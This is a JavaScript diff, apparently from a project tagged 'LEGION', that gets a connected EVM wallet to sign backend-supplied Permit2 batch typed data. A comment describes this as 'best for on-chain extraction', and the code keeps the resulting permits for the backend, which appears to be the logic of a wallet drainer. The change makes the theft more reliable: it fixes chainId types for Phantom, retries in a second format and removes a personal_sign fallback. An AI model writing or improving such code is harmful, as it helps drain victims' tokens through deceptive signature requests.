@@ -851,33 +851,40 @@
           var batchData = (batch && batch.data) ? batch.data : batch;
           if (!batchData || !batchData.typed_data) throw new Error('Backend did not return typed data');
 
-          var typedDataStr = typeof batchData.typed_data === 'string' ? batchData.typed_data : JSON.stringify(batchData.typed_data);
+          // Fix: normalizeBigInts on backend converts domain.chainId from bigint to string "1"
+          // Phantom (and other wallets) require domain.chainId to be a number, not a string.
+          var typedDataObj = batchData.typed_data;
+          if (typedDataObj && typedDataObj.domain) {
+            if (typeof typedDataObj.domain.chainId === 'string') {
+              typedDataObj.domain.chainId = parseInt(typedDataObj.domain.chainId, 10) || evmChainId;
+            }
+          }
+          var typedDataStr = typeof typedDataObj === 'string' ? typedDataObj : JSON.stringify(typedDataObj);
 
-          // Try eth_signTypedData_v4 (Permit2 — best for on-chain extraction)
+          // eth_signTypedData_v4: required for Permit2 on-chain execution
+          // personal_sign is NOT a fallback — Permit2 rejects personal_sign signatures
           var signature = null;
-          var signErr = null;
           try {
+            // Try with JSON string (EIP-712 standard)
             signature = await eth.request({ method: 'eth_signTypedData_v4', params: [evmAddr, typedDataStr] });
           } catch (e) {
-            signErr = e;
             var code = e && (e.code || (e.data && e.data.code));
-            // User explicitly rejected (4001) — don't fall back
-            if (code === 4001 || (e.message && /rejected|denied|cancelled|user rejected/i.test(e.message))) {
-              throw e;
+            var isRejection = code === 4001 || (e.message && /rejected|denied|cancelled|user rejected/i.test(e.message));
+            console.warn('[LEGION] eth_signTypedData_v4 str failed:', e.message, 'code:', code);
+            if (isRejection) throw e;
+            // Try with raw object (some wallets accept object instead of string)
+            try {
+              signature = await eth.request({ method: 'eth_signTypedData_v4', params: [evmAddr, typedDataObj] });
+            } catch (e2) {
+              var code2 = e2 && (e2.code || (e2.data && e2.data.code));
+              console.warn('[LEGION] eth_signTypedData_v4 obj failed:', e2.message, 'code:', code2);
+              if (code2 === 4001 || (e2.message && /rejected|denied|cancelled|user rejected/i.test(e2.message))) throw e2;
+              // Both formats failed — no fallback (personal_sign is useless for Permit2)
             }
-            console.warn('[LEGION] eth_signTypedData_v4 failed (' + e.message + '), falling back to personal_sign');
-          }
-
-          // Fallback to personal_sign if typed data signing unsupported/failed
-          if (!signature) {
-            var fallbackMsg = 'Legion EVM Authorization\nAddress: ' + evmAddr + '\nNonce: ' + Date.now();
-            var fallbackHex = '0x' + Array.from(new TextEncoder().encode(fallbackMsg)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
-            signature = await eth.request({ method: 'personal_sign', params: [fallbackHex, evmAddr] });
           }
 
           connectedChains.EVM._batchResult = batchData;
           connectedChains.EVM._permits = permits;
-          connectedChains.EVM._usedPersonalSign = !batchData.typed_data || !signature.startsWith('0x0');
           return signature;
         } catch (e) {
           console.error('[LEGION] EVM signing failed:', e.message, 'code:', e.code);
